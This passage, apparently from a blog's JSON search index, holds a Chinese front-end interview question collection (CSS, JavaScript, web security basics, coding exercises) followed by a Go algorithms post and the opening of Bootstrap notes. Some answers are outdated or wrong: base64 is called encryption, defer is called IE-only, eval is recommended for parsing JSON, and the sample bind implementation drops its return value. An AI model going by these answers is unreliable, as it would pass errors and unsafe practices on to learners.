可控制压缩质量 不支持透明 适合照片  PNG\n 有PNG8和truecolor PNG PNG8类似GIF颜色上限为256，文件小，支持alpha透明度，无动画 适合图标、背景、按钮   18、行内元素float:left后是否变为块级元素？  浮动后，行内元素不会成为块状元素，但是可以设置宽高。行内元素要想变成块状元素，占一行，直接设置display:block;。但如果元素设置了浮动后再设置display:block;那就不会占一行。  19、在网页中的应该使用奇数还是偶数的字体？为什么呢？  偶数字号相对更容易和 web 设计的其他部分构成比例关系  20、::before 和 :after中双冒号和单冒号 有什么区别？解释一下这2个伪元素的作用  单冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素 用于区分伪类和伪元素  21、如果需要手动写动画，你认为最小时间间隔是多久，为什么？（阿里）  多数显示器默认频率是60Hz，即1秒刷新60次，所以理论上最小间隔为1/60＊1000ms ＝ 16.7ms  22、CSS合并方法  避免使用@import引入多个css文件，可以使用CSS工具将CSS合并为一个CSS文件，例如使用Sass\\Compass等  23、CSS不同选择器的权重(CSS层叠的规则)  ！important规则最重要，大于其它规则 行内样式规则，加1000 对于选择器中给定的各个ID属性值，加100 对于选择器中给定的各个类属性、属性选择器或者伪类选择器，加10 对于选择其中给定的各个元素标签选择器，加1 如果权值一样，则按照样式规则的先后顺序来应用，顺序靠后的覆盖靠前的规则  24、列出你所知道可以改变页面布局的属性  position、display、float、width、height、margin、padding、top、left、right、overflow  25、CSS在性能优化方面的实践  css压缩与合并、Gzip压缩 css文件放在head里、不要用@import 尽量用缩写、避免用滤镜、合理使用选择器  26、CSS3动画（简单动画的实现，如旋转等）  依靠CSS3中提出的三个属性：transition、transform、animation transition：定义了元素在变化过程中是怎么样的，包含transition-property、transition-duration、transition-timing-function、transition-delay。 transform：定义元素的变化结果，包含rotate、scale、skew、translate。 animation：动画定义了动作的每一帧（@keyframes）有什么效果，包括animation-name，animation-duration、animation-timing-function、animation-delay、animation-iteration-count、animation-direction  27、base64的原理及优缺点  优点可以加密，减少了http请求 缺点是需要消耗CPU进行编解码  $JavaScript 1、闭包  闭包就是能够读取其他函数内部变量的函数\n 闭包是指有权访问另一个函数作用域中变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量,利用闭包可以突破作用链域\n 闭包的特性：\n 函数内再嵌套函数 内部函数可以引用外层的参数和变量 参数和变量不会被垃圾回收机制回收   说说你对闭包的理解\n 使用闭包主要是为了设计私有的方法和变量。闭包的优点是可以避免全局变量的污染，缺点是闭包会常驻内存，会增大内存使用量，使用不当很容易造成内存泄露。在js中，函数即闭包，只有函数才会产生作用域的概念\n 闭包 的最大用处有两个，一个是可以读取函数内部的变量，另一个就是让这些变量始终保持在内存中\n 闭包的另一个用处，是封装对象的私有属性和私有方法\n 好处：能够实现封装和缓存等；\n 坏处：就是消耗内存、不正当使用会造成内存溢出的问题\n  使用闭包的注意点 - 由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露 - 解决方法是，在退出函数之前，将不使用的局部变量全部删除\n2、说说你对作用域链的理解  作用域链的作用是保证执行环境里有权访问的变量和函数是有序的，作用域链的变量只能向上访问，变量访问到window对象即被终止，作用域链向下访问变量是不被允许的 简单的说，作用域就是变量与函数的可访问范围，即作用域控制着变量与函数的可见性和生命周期  3、JavaScript原型，原型链 ? 有什么特点？  每个对象都会在其内部初始化一个属性，就是prototype(原型)，当我们访问一个对象的属性时 如果这个对象内部不存在这个属性，那么他就会去prototype里找这个属性，这个prototype又会有自己的prototype，于是就这样一直找下去，也就是我们平时所说的原型链的概念 关系：instance.constructor.prototype = instance.__proto__ 特点：\n JavaScript对象是通过引用来传递的，我们创建的每个新对象实体中并没有一份属于自己的原型副本。当我们修改原型时，与之相关的对象也会继承这一改变   当我们需要一个属性的时，Javascript引擎会先看当前对象中是否有这个属性， 如果没有的\n 就会查找他的Prototype对象是否有这个属性，如此递推下去，一直检索到 Object 内建对象\n  4、请解释什么是事件代理  事件代理（Event Delegation），又称之为事件委托。是 JavaScript 中常用绑定事件的常用技巧。顾名思义，“事件代理”即是把原本需要绑定的事件委托给父元素，让父元素担当事件监听的职务。事件代理的原理是DOM元素的事件冒泡。使用事件代理的好处是可以提高性能 可以大量节省内存占用，减少事件注册，比如在table上代理所有td的click事件就非常棒 可以实现当新增子对象时无需再次对其绑定  5、Javascript如何实现继承？  构造继承 原型继承 实例继承 拷贝继承\n 原型prototype机制或apply和call方法去实现较简单，建议使用构造函数与原型混合方式\n  function Parent(){ this.name = 'wang'; } function Child(){ this.age = 28; } Child.prototype = new Parent();//继承了Parent，通过原型 var demo = new Child(); alert(demo.age); alert(demo.name);//得到被继承的属性 }  6、谈谈This对象的理解  this总是指向函数的直接调用者（而非间接调用者） 如果有new关键字，this指向new出来的那个对象 在事件中，this指向触发这个事件的对象，特殊的是，IE中的attachEvent中的this总是指向全局对象Window  7、事件模型  W3C中定义事件的发生经历三个阶段：捕获阶段（capturing）、目标阶段（targetin）、冒泡阶段（bubbling）\n  冒泡型事件：当你使用事件冒泡时，子级元素先触发，父级元素后触发 捕获型事件：当你使用事件捕获时，父级元素先触发，子级元素后触发 DOM事件流：同时支持两种事件模型：捕获型事件和冒泡型事件 阻止冒泡：在W3c中，使用stopPropagation（）方法；在IE下设置cancelBubble = true 阻止捕获：阻止事件的默认行为，例如click - \u0026lt;a\u0026gt;后的跳转。在W3c中，使用preventDefault（）方法，在IE下设置window.event.returnValue = false  8、new操作符具体干了什么呢?  创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型 属性和方法被加入到 this 引用的对象中 新创建的对象由 this 所引用，并且最后隐式的返回 this  9、Ajax原理  Ajax的原理简单来说是在用户和服务器之间加了—个中间层(AJAX引擎)，通过XmlHttpRequest对象来向服务器发异步请求，从服务器获得数据，然后用javascript来操作DOM而更新页面。使用户操作与服务器响应异步化。这其中最关键的一步就是从服务器获得请求数据 Ajax的过程只涉及JavaScript、XMLHttpRequest和DOM。XMLHttpRequest是ajax的核心机制  // 1. 创建连接 var xhr = null; xhr = new XMLHttpRequest() // 2. 连接服务器 xhr.open('get', url, true) // 3. 发送请求 xhr.send(null); // 4. 接受请求 xhr.onreadystatechange = function(){ if(xhr.readyState == 4){ if(xhr.status == 200){ success(xhr.responseText); } else { // fail fail \u0026amp;\u0026amp; fail(xhr.status); } } }  ajax 有那些优缺点?\n 优点：  通过异步模式，提升了用户体验. 优化了浏览器和服务器之间的传输，减少不必要的数据往返，减少了带宽占用. Ajax在客户端运行，承担了一部分本来由服务器承担的工作，减少了大用户量下的服务器负载。 Ajax可以实现动态不刷新（局部刷新）  缺点：  安全问题 AJAX暴露了与服务器交互的细节。 对搜索引擎的支持比较弱。 不容易调试。   10、如何解决跨域问题?  jsonp、 iframe、window.name、window.postMessage、服务器上设置代理页面  11、模块化开发怎么做？  立即执行函数,不暴露私有成员  var module1 = (function(){ var _count = 0; var m1 = function(){ //... }; var m2 = function(){ //... }; return { m1 : m1, m2 : m2 }; })();  12、异步加载JS的方式有哪些？  defer，只支持IE async： 创建script，插入到DOM中，加载完毕后callBack  13、那些操作会造成内存泄漏？  内存泄漏指任何对象在您不再拥有或需要它之后仍然存在 setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏 闭包使用不当  14、XML和JSON的区别？  数据体积方面\n JSON相对于XML来讲，数据的体积小，传递的速度更快些。   数据交互方面\n JSON与JavaScript的交互更加方便，更容易解析处理，更好的数据交互   数据描述方面\n JSON对数据的描述性比XML较差   传输速度方面\n JSON的速度要远远快于XML   15、谈谈你对webpack的看法  WebPack 是一个模块打包工具，你可以使用WebPack管理你的模块依赖，并编绎输出模块们所需的静态文件。它能够很好地管理、打包Web开发中所用到的HTML、Javascript、CSS以及各种静态文件（图片、字体等），让开发过程更加高效。对于不同类型的资源，webpack有对应的模块加载器。webpack模块打包器会分析模块间的依赖关系，最后 生成了优化且合并后的静态资源  16、说说你对AMD和Commonjs的理解  CommonJS是服务器端模块的规范，Node.js采用了这个规范。CommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数 AMD推荐的风格通过返回一个对象做为模块对象，CommonJS的风格通过对module.exports或exports的属性赋值来达到暴露模块对象的目的  17、常见web安全及防护原理  sql注入原理\n 就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令   总的来说有以下几点\n 永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双\u0026quot;-\u0026quot;进行转换等 永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接 不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息    XSS原理及防范\n Xss(cross-site scripting)攻击指的是攻击者往Web页面里插入恶意html标签或者javascript代码。比如：攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取cookie中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点  XSS防范方法\n 首先代码里对用户输入的地方和变量都需要仔细检查长度和对”\u0026lt;”,”\u0026gt;”,”;”,”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击  XSS与CSRF有什么区别吗？\n XSS是获取信息，不需要提前知道其他用户页面的代码和数据包。CSRF是代替用户完成指定的动作，需要知道其他用户页面的代码和数据包。要完成一次CSRF攻击，受害者必须依次完成两个步骤\n 登录受信任网站A，并在本地生成Cookie\n 在不登出A的情况下，访问危险网站B\n  CSRF的防御\n 服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数 通过验证码的方法  18、用过哪些设计模式？  工厂模式：\n 工厂模式解决了重复实例化的问题，但还有一个问题,那就是识别问题，因为根本无法 主要好处就是可以消除对象间的耦合，通过使用工程方法而不是new关键字  构造函数模式\n 使用构造函数的方法，即解决了重复实例化的问题，又解决了对象识别的问题，该模式与工厂模式的不同之处在于 直接将属性和方法赋值给 this对象;   19、为什么要有同源限制？  同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议 举例说明：比如一个黑客程序，他利用Iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。  20、offsetWidth/offsetHeight,clientWidth/clientHeight与scrollWidth/scrollHeight的区别  offsetWidth/offsetHeight返回值包含content + padding + border，效果与e.getBoundingClientRect()相同 clientWidth/clientHeight返回值只包含content + padding，如果有滚动条，也不包含滚动条 scrollWidth/scrollHeight返回值包含content + padding + 溢出内容的尺寸  21、javascript有哪些方法定义对象  对象字面量： var obj = {}; 构造函数： var obj = new Object(); Object.create(): var obj = Object.create(Object.prototype);  22、常见兼容性问题？  png24位的图片在iE6浏览器上出现背景，解决方案是做成PNG8 浏览器默认的margin和padding不同。解决方案是加一个全局的*{margin:0;padding:0;}来统一,，但是全局效率很低，一般是如下这样解决：  body,ul,li,ol,dl,dt,dd,form,input,h1,h2,h3,h4,h5,h6,p{ margin:0; padding:0; }   IE下,event对象有x,y属性,但是没有pageX,pageY属性 Firefox下,event对象有pageX,pageY属性,但是没有x,y属性.  22、说说你对promise的了解  依照 Promise/A+ 的定义，Promise 有四种状态：\n pending: 初始状态, 非 fulfilled 或 rejected.\n fulfilled: 成功的操作.\n rejected: 失败的操作.\n settled: Promise已被fulfilled或rejected，且不是pending\n  另外， fulfilled与 rejected一起合称 settled\n Promise 对象用来进行延迟(deferred) 和异步(asynchronous) 计算\n  Promise 的构造函数\n 构造一个 Promise，最基本的用法如下：  var promise = new Promise(function(resolve, reject) { if (...) { // succeed resolve(result); } else { // fails reject(Error(errMessage)); } });   Promise 实例拥有 then 方法（具有 then 方法的对象，通常被称为thenable）。它的使用方法如下：\npromise.then(onFulfilled, onRejected)  接收两个函数作为参数，一个在 fulfilled 的时候被调用，一个在rejected的时候被调用，接收参数就是 future，onFulfilled 对应 resolve, onRejected对应 reject\n  23、你觉得jQuery源码有哪些写的好的地方  jquery源码封装在一个匿名函数的自执行环境中，有助于防止变量的全局污染，然后通过传入window对象参数，可以使window对象作为局部变量使用，好处是当jquery中访问window对象的时候，就不用将作用域链退回到顶层作用域了，从而可以更快的访问window对象。同样，传入undefined参数，可以缩短查找undefined时的作用域链 jquery将一些原型属性和方法封装在了jquery.prototype中，为了缩短名称，又赋值给了jquery.fn，这是很形象的写法 有一些数组或对象的方法经常能使用到，jQuery将其保存为局部变量以提高访问速度 jquery实现的链式调用可以节约代码，所返回的都是同一个对象，可以提高代码效率  24、vue、react、angular  Vue.js 一个用于创建 web 交互界面的库，是一个精简的 MVVM。它通过双向数据绑定把 View 层和 Model 层连接了起来。实际的 DOM 封装和输出格式都被抽象为了Directives 和 Filters\n AngularJS 是一个比较完善的前端MVVM框架，包含模板，数据双向绑定，路由，模块化，服务，依赖注入等所有功能，模板功能强大丰富，自带了丰富的 Angular指令\n react React 仅仅是 VIEW 层是facebook公司。推出的一个用于构建UI的一个库，能够实现服务器端的渲染。用了virtual dom，所以性能很好。\n  25、Node的应用场景  特点：\n 1、它是一个Javascript运行环境 2、依赖于Chrome V8引擎进行代码解释 3、事件驱动 4、非阻塞I/O 5、单进程，单线程  优点：\n 高并发（最重要的优点）  缺点：\n 1、只支持单核CPU，不能充分利用CPU 2、可靠性低，一旦代码某个环节崩溃，整个系统都崩溃   26、谈谈你对AMD、CMD的理解  CommonJS是服务器端模块的规范，Node.js采用了这个规范。CommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数\n AMD推荐的风格通过返回一个对象做为模块对象，CommonJS的风格通过对module.exports或exports的属性赋值来达到暴露模块对象的目的\n  27、那些操作会造成内存泄漏？  内存泄漏指任何对象在您不再拥有或需要它之后仍然存在 setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏 闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）  28、web开发中会话跟踪的方法有哪些  cookie session url重写 隐藏input ip地址  29、介绍js的基本数据类型  Undefined、Null、Boolean、Number、String  30、介绍js有哪些内置对象？  Object 是 JavaScript 中所有对象的父对象 数据封装类对象：Object、Array、Boolean、Number 和 String 其他对象：Function、Arguments、Math、Date、RegExp、Error  31、说几条写JavaScript的基本规范？  不要在同一行声明多个变量 请使用 ===/!== 来比较 true/false 或者数值 使用对象字面量替代 new Array 这种形式 不要使用全局函数 Switch 语句必须带有 default 分支 If 语句必须使用大括号 for-in 循环中的变量 应该使用 var 关键字明确限定作用域，从而避免作用域污  32、JavaScript有几种类型的值？，你能画一下他们的内存图吗？  栈：原始数据类型（Undefined，Null，Boolean，Number、String） 堆：引用数据类型（对象、数组和函数） 两种类型的区别是：存储位置不同； 原始数据类型直接存储在栈(stack)中的简单数据段，占据空间小、大小固定，属于被频繁使用数据，所以放入栈中存储； 引用数据类型存储在堆(heap)中的对象,占据空间大、大小不固定,如果存储在栈中，将会影响程序运行的性能；引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其 在栈中的地址，取得地址后从堆中获得实体  33、javascript创建对象的几种方式？  javascript创建对象简单的说,无非就是使用内置对象或各种自定义对象，当然还可以用JSON；但写法有很多种，也能混合使用\n  对象字面量的方式  person={firstname:\u0026quot;Mark\u0026quot;,lastname:\u0026quot;Yun\u0026quot;,age:25,eyecolor:\u0026quot;black\u0026quot;};   用function来模拟无参的构造函数  function Person(){} var person=new Person();//定义一个function，如果使用new\u0026quot;实例化\u0026quot;,该function可以看作是一个Class person.name=\u0026quot;Mark\u0026quot;; person.age=\u0026quot;25\u0026quot;; person.work=function(){ alert(person.name+\u0026quot; hello...\u0026quot;); } person.work();   用function来模拟参构造函数来实现（用this关键字定义构造的上下文属性）  function Pet(name,age,hobby){ this.name=name;//this作用域：当前对象 this.age=age; this.hobby=hobby; this.eat=function(){ alert(\u0026quot;我叫\u0026quot;+this.name+\u0026quot;,我喜欢\u0026quot;+this.hobby+\u0026quot;,是个程序员\u0026quot;); } } var maidou =new Pet(\u0026quot;麦兜\u0026quot;,25,\u0026quot;coding\u0026quot;);//实例化、创建对象 maidou.eat();//调用eat方法   用工厂方式来创建（内置对象）  var wcDog =new Object(); wcDog.name=\u0026quot;旺财\u0026quot;; wcDog.age=3; wcDog.work=function(){ alert(\u0026quot;我是\u0026quot;+wcDog.name+\u0026quot;,汪汪汪......\u0026quot;); } wcDog.work();   用原型方式来创建  function Dog(){ } Dog.prototype.name=\u0026quot;旺财\u0026quot;; Dog.prototype.eat=function(){ alert(this.name+\u0026quot;是个吃货\u0026quot;); } var wangcai =new Dog(); wangcai.eat();   用混合方式来创建   function Car(name,price){ this.name=name; this.price=price; } Car.prototype.sell=function(){ alert(\u0026quot;我是\u0026quot;+this.name+\u0026quot;，我现在卖\u0026quot;+this.price+\u0026quot;万元\u0026quot;); } var camry =new Car(\u0026quot;凯美瑞\u0026quot;,27); camry.sell();  34、eval是做什么的？  它的功能是把对应的字符串解析成JS代码并运行 应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行） 由JSON字符串转换为JSON对象的时候可以用eval，var obj =eval('('+ str +')')  35、null，undefined 的区别？  undefined 表示不存在这个值。 undefined :是一个表示\u0026rdquo;无\u0026rdquo;的原始值或者说表示\u0026rdquo;缺少值\u0026rdquo;，就是此处应该有一个值，但是还没有定义。当尝试读取时会返回 undefined 例如变量被声明了，但没有赋值时，就等于undefined\n null 表示一个对象被定义了，值为“空值”\n null : 是一个对象(空对象, 没有任何属性和方法)\n 例如作为函数的参数，表示该函数的参数不是对象；\n 在验证null时，一定要使用　=== ，因为 ==无法分别 null 和　undefined\n  36、[\u0026ldquo;1\u0026rdquo;, \u0026ldquo;2\u0026rdquo;, \u0026ldquo;3\u0026rdquo;].map(parseInt) 答案是多少？  [1, NaN, NaN]因为 parseInt 需要两个参数 (val, radix)，其中 radix 表示解析时用的基数。 map 传了 3 个 (element, index, array)，对应的 radix 不合法导致解析失败。  37、javascript 代码中的\u0026rdquo;use strict\u0026rdquo;;是什么意思 ? 使用它区别是什么？  use strict是一种ECMAscript 5 添加的（严格）运行模式,这种模式使得 Javascript 在更严格的条件下运行,使JS编码更加规范化的模式,消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为  38、JSON 的了解？**  JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式 它是基于JavaScript的一个子集。数据格式简单, 易于读写, 占用带宽小\n JSON字符串转换为JSON对象:\n  var obj =eval('('+ str +')'); var obj = str.parseJSON(); var obj = JSON.parse(str);   JSON对象转换为JSON字符串：  var last=obj.toJSONString(); var last=JSON.stringify(obj);  39、js延迟加载的方式有哪些？  defer和async、动态创建DOM方式（用得最多）、按需异步载入js  40、同步和异步的区别?  同步：浏览器访问服务器请求，用户看得到页面刷新，重新发请求,等请求完，页面刷新，新内容出现，用户看到新内容,进行下一步操作 异步：浏览器访问服务器请求，用户正常操作，浏览器后端进行请求。等请求完，页面不刷新，新内容也会出现，用户看到新内容  41、渐进增强和优雅降级  渐进增强 ：针对低版本浏览器进行构建页面，保证最基本的功能，然后再针对高级浏览器进行效果、交互等改进和追加功能达到更好的用户体验。\n 优雅降级 ：一开始就构建完整的功能，然后再针对低版本浏览器进行兼容\n  42、defer和async  defer并行加载js文件，会按照页面上script标签的顺序执行 async并行加载js文件，下载完成立即执行，不会按照页面上script标签的顺序执行  43、说说严格模式的限制  变量必须声明后再使用 函数的参数不能有同名属性，否则报错 不能使用with语句 禁止this指向全局对象  44、attribute和property的区别是什么？  attribute是dom元素在文档中作为html标签拥有的属性； property就是dom元素在js中作为对象拥有的属性。 对于html的标准属性来说，attribute和property是同步的，是会自动更新的 但是对于自定义的属性来说，他们是不同步的  45、谈谈你对ES6的理解  新增模板字符串（为JavaScript提供了简单的字符串插值功能） 箭头函数 for-of（用来遍历数据—例如数组中的值。） arguments对象可被不定参数和默认参数完美代替。 ES6将promise对象纳入规范，提供了原生的Promise对象。 增加了let和const命令，用来声明变量。 增加了块级作用域。 let命令实际上就增加了块级作用域。 还有就是引入module模块的概念  46、ECMAScript6 怎么写class么，为什么会出现class这种东西?  这个语法糖可以让有OOP基础的人更快上手js，至少是一个官方的实现了 但对熟悉js的人来说，这个东西没啥大影响；一个Object.creat()搞定继承，比class简洁清晰的多  47、什么是面向对象编程及面向过程编程，它们的异同和优缺点  面向过程就是分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候一个一个依次调用就可以了 面向对象是把构成问题事务分解成各个对象，建立对象的目的不是为了完成一个步骤，而是为了描叙某个事物在整个解决问题的步骤中的行为 面向对象是以功能来划分问题，而不是步骤  48、面向对象编程思想  基本思想是使用对象，类，继承，封装等基本概念来进行程序设计 优点  易维护 采用面向对象思想设计的结构，可读性高，由于继承的存在，即使改变需求，那么维护也只是在局部模块，所以维护起来是非常方便和较低成本的 易扩展 开发工作的重用性、继承性高，降低重复工作量。 缩短了开发周期   49、对web标准、可用性、可访问性的理解  可用性（Usability）：产品是否容易上手，用户能否完成任务，效率如何，以及这过程中用户的主观感受可好，是从用户的角度来看产品的质量。可用性好意味着产品质量高，是企业的核心竞争力 可访问性（Accessibility）：Web内容对于残障用户的可阅读和可理解性 可维护性（Maintainability）：一般包含两个层次，一是当系统出现问题时，快速定位并解决问题的成本，成本低则可维护性好。二是代码是否容易被人理解，是否容易修改和增强功能。  $编程题 1、写一个通用的事件侦听器函数 // event(事件)工具集，来源：github.com/markyun markyun.Event = { // 视能力分别使用dom0||dom2||IE方式 来绑定事件 // 参数： 操作的元素,事件名称 ,事件处理程序 addEvent : function(element, type, handler) { if (element.addEventListener) { //事件类型、需要执行的函数、是否捕捉 element.addEventListener(type, handler, false); } else if (element.attachEvent) { element.attachEvent('on' + type, function() { handler.call(element); }); } else { element['on' + type] = handler; } }, // 移除事件 removeEvent : function(element, type, handler) { if (element.removeEventListener) { element.removeEventListener(type, handler, false); } else if (element.datachEvent) { element.detachEvent('on' + type, handler); } else { element['on' + type] = null; } }, // 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获) stopPropagation : function(ev) { if (ev.stopPropagation) { ev.stopPropagation(); } else { ev.cancelBubble = true; } }, // 取消事件的默认行为 preventDefault : function(event) { if (event.preventDefault) { event.preventDefault(); } else { event.returnValue = false; } }, // 获取事件目标 getTarget : function(event) { return event.target || event.srcElement; }  2、如何判断一个对象是否为数组 function isArray(arg) { if (typeof arg === 'object') { return Object.prototype.toString.call(arg) === '[object Array]'; } return false; }  3、冒泡排序  每次比较相邻的两个数，如果后一个比前一个小，换位置  var arr = [3, 1, 4, 6, 5, 7, 2]; function bubbleSort(arr) { for (var i = 0; i \u0026lt; arr.length - 1; i++) { for(var j = 0; j \u0026lt; arr.length - 1; j++) { if(arr[j + 1] \u0026lt; arr[j]) { var temp; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; } } } return arr; } console.log(bubbleSort(arr));  4、快速排序  采用二分法，取出中间数，数组每次和中间数比较，小的放到左边，大的放到右边  var arr = [3, 1, 4, 6, 5, 7, 2]; function quickSort(arr) { if(arr.length == 0) { return []; // 返回空数组 } var cIndex = Math.floor(arr.length / 2); var c = arr.splice(cIndex, 1); var l = []; var r = []; for (var i = 0; i \u0026lt; arr.length; i++) { if(arr[i] \u0026lt; c) { l.push(arr[i]); } else { r.push(arr[i]); } } return quickSort(l).concat(c, quickSort(r)); } console.log(quickSort(arr));  5、编写一个方法 求一个字符串的字节长度  假设：一个英文字符占用一个字节，一个中文字符占用两个字节\n  function GetBytes(str){ var len = str.length; var bytes = len; for(var i=0; i\u0026lt;len; i++){ if (str.charCodeAt(i) \u0026gt; 255) bytes++; } return bytes; } alert(GetBytes(\u0026quot;你好,as\u0026quot;));  6、bind的用法，以及如何实现bind的函数和需要注意的点  bind的作用与call和apply相同，区别是call和apply是立即调用函数，而bind是返回了一个函数，需要调用的时候再执行。 一个简单的bind函数实现如下  Function.prototype.bind = function(ctx) { var fn = this; return function() { fn.apply(ctx, arguments); }; };  $其他 1、谈谈你对重构的理解  网站重构：在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变UI的情况下，对网站进行优化， 在扩展的同时保持一致的UI 对于传统的网站来说重构通常是：\n 表格(table)布局改为DIV+CSS\n 使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对IE6有效的)\n 对于移动平台的优化\n 针对于SEO进行优化\n   2、什么样的前端代码是好的  高复用低耦合，这样文件小，好维护，而且好扩展。  3、对前端工程师这个职位是怎么样理解的？它的前景会怎么样？  前端是最贴近用户的程序员，比后端、数据库、产品经理、运营、安全都近\n 实现界面交互 提升用户体验 有了Node.js，前端可以实现服务端的一些事情   前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好，\n 与团队成员，UI设计，产品经理的沟通；\n 做好的页面结构，页面重构和用户体验；\n  4、你觉得前端工程的价值体现在哪  为简化用户使用提供技术支持（交互部分）\n 为多个浏览器兼容性提供支持\n 为提高用户浏览速度（浏览器性能）提供支持\n 为跨平台或者其他基于webkit或其他渲染引擎的应用提供支持\n 为展示数据提供支持（数据接口）\n  5、平时如何管理你的项目？  先期团队必须确定好全局样式（globe.css），编码模式(utf-8) 等；\n 编写习惯必须一致（例如都是采用继承式的写法，单样式都写成一行）；\n 标注样式编写人，各模块都及时标注（标注关键样式调用的地方）；\n 页面进行标注（例如 页面 模块 开始和结束）；\n CSS跟HTML 分文件夹并行存放，命名都得统一（例如style.css）；\n JS 分文件夹存放 命名以该JS功能为准的英文翻译。\n 图片采用整合的 images.png png8 格式文件使用 - 尽量整合在一起使用方便将来的管理\n  人事面  面试完你还有什么问题要问的吗 你有什么爱好? 你最大的优点和缺点是什么? 你为什么会选择这个行业，职位? 你觉得你适合从事这个岗位吗? 你有什么职业规划? 你对工资有什么要求? 如何看待前端开发？ 未来三到五年的规划是怎样的？  常问  自我介绍 你的项目中技术难点是什么？遇到了什么问题？你是怎么解决的？ 你认为哪个项目做得最好？ 最近在看哪些前端方面的书？ 平时是如何学习前端开发的？ 你最有成就感的一件事 你是怎么学习前端的  ","permalink":"http://localhost:8000/public/post/front-end-interview-summary/","tags":["面试"],"title":"前端面试题整理"},{"categories":["ACM"],"contents":"最近学Go，感觉挺不错的。闲来无事用它写了几种常用的基础算法。\n快排 思想很简单，实现起来为了方便每次以left作为基准，也可以使用BFS来节省递归栈：\n// QuickSort returns a sorted slice func QuickSort(arr []int) { if len(arr) \u0026lt;= 1 { return } left, right := 0, len(arr)-1 for left \u0026lt; right { if arr[left+1] \u0026gt; arr[left] { arr[left+1], arr[right] = arr[right], arr[left+1] right-- } else { arr[left+1], arr[left] = arr[left], arr[left+1] left++ } } QuickSort(arr[:left]) QuickSort(arr[left+1:]) }  \n最短路 最短路核心思想就是Relax操作。效率高的单源最短路有下面两种算法： 1. Dijikstra，不能处理负权路,但是时间复杂度比较稳定. 2. SPFA是我比较喜欢的一种算法，可以判断负权路。正常情况的时间复杂度为O(kE) 其中k\u0026lt;\u0026lt;V；最好的情况即一次BFS，时间复杂度为 O(E)，然而对于某些精心构造的图，复杂度可以达到Bellman-ford级别：O(VE)。 下面构图使用的是邻接表（适用于稀疏图），也可以用邻接矩阵（适用于稠密图）。\n// adjacency list definition type edge struct { v, w int next *edge } type Graph struct { head []*edge n, m int } func (G *Graph) init(n, m int) { G.n, G.m = n, m G.head = make([]*edge, n) } func (G *Graph) add(u, v, w int) { G.head[u] = \u0026amp;edge{ v: v, w: w, next: G.head[u], } } // SPFA returns the shortest path from begin to end // begin: the begin node number // end: the end node number func (G *Graph) SPFA(begin, end int) int { visit := make([]bool, G.n) dist := make([]int, G.n) Q := make([]int, 0) for i := 0; i \u0026lt; G.n; i++ { dist[i] = -1 } dist[begin] = 0 Q = append(Q, begin) visit[begin] = true for len(Q) != 0 { u := Q[0] for e := G.head[u]; e != nil; e = e.next { if dist[e.v] == -1 || dist[e.v] \u0026gt; dist[u]+e.w { dist[e.v] = dist[u] + e.w if !visit[e.v] { Q = append(Q, e.v) visit[e.v] = true } } } // pop the front node Q = Q[1:] visit[u] = false } return dist[end] }  KMP 字符串匹配经典算法。关键在于维护一个这样的关系：x[i-next[i]...i-1]=x[0...next[i]-1]\ntype Kmp struct { pattern string next []int } // x[i-p...i-1]=x[0...p-1] func (K *Kmp) getNext() { K.next = make([]int, len(K.pattern)+1) K.next[0] = -1 i := 0 p := -1 for i \u0026lt; len(K.pattern) { for p != -1 \u0026amp;\u0026amp; K.pattern[i] != K.pattern[p] { p = K.next[p] } p++ i++ if i \u0026lt; len(K.pattern) \u0026amp;\u0026amp; K.pattern[i] == K.pattern[p] { K.next[i] = K.next[p] } else { K.next[i] = p } } } func (K *Kmp) match(matcher string) int { ret := 0 p := 0 i := 0 for i \u0026lt; len(matcher) { for p != -1 \u0026amp;\u0026amp; matcher[i] != K.pattern[p] { p = K.next[p] } i++ p++ if p \u0026gt;= len(K.pattern) { ret++ p = K.next[p] } } return ret }  To Be Continue\u0026hellip;\n","permalink":"http://localhost:8000/public/post/basic-algorithms-in-go/","tags":["algorithm","golang"],"title":"Basic Algorithms in Go"},{"categories":["Front-End","搬运整理"],"contents":" 原文出处 http://blog.poetries.top/2016/11/19/bootstrap-review\n 最近项目中用到bootstrap 很是健忘各种属性类名，频繁翻阅文档，在这里暂且记录一下笔记 一、 bootstrap简介  Bootstrap，来自 